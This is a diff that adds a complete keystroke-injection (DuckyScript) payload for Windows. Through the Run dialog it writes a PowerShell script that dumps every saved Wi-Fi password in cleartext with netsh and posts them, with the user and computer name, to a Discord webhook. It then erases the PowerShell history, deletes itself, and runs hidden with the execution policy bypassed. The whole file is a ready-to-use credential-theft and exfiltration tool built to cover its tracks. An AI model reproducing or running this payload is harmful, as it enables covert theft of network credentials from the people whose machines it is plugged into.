@@ -1,0 +1,134 @@
+DELAY 2000
+
+REM Initialize the .ps1 file with empty content
+GUI r
+DELAY 500
+STRING powershell -Command "Set-Content -Path 'C:/Users/Public/wifi.ps1' -Value ''"
+ENTER
+DELAY 1000
+
+REM Append webhook URL
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '$d=\"Your-Discord-Webhook-Here\"'"
+ENTER
+DELAY 1000
+
+REM Append user info variable
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '$s=\"$env:USERNAME@$env:COMPUTERNAME\"'"
+ENTER
+DELAY 1000
+
+REM Append empty array initialization
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '$o=@()'"
+ENTER
+DELAY 1000
+
+REM Append profiles fetching loop start
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '(netsh wlan show profiles) | ? { $_ -match \":\s(.+)$\" } | % {'"
+ENTER
+DELAY 1000
+
+REM Append network name extraction
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '    $n = ($_ -split \":\")[-1].Trim()'"
+ENTER
+DELAY 1000
+
+REM Append password extraction line
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '    $p = (netsh wlan show profile name=\"$n\" key=clear | sls \"Key Content\").Line'"
+ENTER
+DELAY 1000
+
+REM Append password fallback check
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '    if ($p) { $p = ($p -split \":\")[-1].Trim() } else { $p = \"<NO_PASSWORD>\" }'"
+ENTER
+DELAY 1000
+
+REM Append formatted line to output array
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '    $o += \"$n : $p\"'"
+ENTER
+DELAY 1000
+
+REM Append closing brace of loop
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '}'"
+ENTER
+DELAY 1000
+
+REM Append join all results into one string
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '$w = $o -join \"`n\"'"
+ENTER
+DELAY 1000
+
+REM Append if condition to post results via webhook
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value 'if ($w) { irm $d -Method Post -Body (@{username=$s; content=\"**Wi-Fi Passwords**`n`n$w\"} | ConvertTo-Json) -ContentType \"application/json\" | Out-Null } else {'"
+ENTER
+DELAY 1000
+
+REM Append else condition to post error message
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '    irm $d -Method Post -Body (@{username=$s; content=\"**Error**: Check ''netsh wlan show profiles'' manually.\"} | ConvertTo-Json) -ContentType \"application/json\" | Out-Null'"
+ENTER
+DELAY 1000
+
+REM Close else block
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '}'"
+ENTER
+DELAY 1000
+
+REM Append command to delete PowerShell history file silently
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value 'del (Get-PSReadlineOption).HistorySavePath -ea 0'"
+ENTER
+DELAY 1000
+
+REM Append command to self-delete the script file
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'"
+ENTER
+DELAY 1000
+
+REM Append sleep for 2 seconds before exit
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value 'Start-Sleep 2'"
+ENTER
+DELAY 1000
+
+REM Append garbage collection call
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Content -Path 'C:/Users/Public/wifi.ps1' -Value '[System.GC]::Collect()'"
+ENTER
+DELAY 1000
+
+REM Finally, execute the script silently with bypass
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\Public\wifi.ps1"
+ENTER
+
